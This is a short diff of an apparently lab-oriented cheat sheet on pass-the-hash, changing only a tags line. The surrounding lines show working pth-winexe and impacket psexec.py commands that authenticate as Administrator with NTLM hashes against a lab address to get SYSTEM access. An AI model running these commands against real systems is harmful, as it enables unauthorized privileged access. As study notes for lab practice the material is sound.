@@ -8,4 +8,4 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74a
 ```cheat passthehash --> nt authority\system
 python psexec.py Administrator@10.10.10.63 -hashes "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00"
 
-tags: passthehash pass the hash pth-winexe ippsec silo
+tags: #passthehash #pass #the #hash #pth-winexe #ippsec #silo 
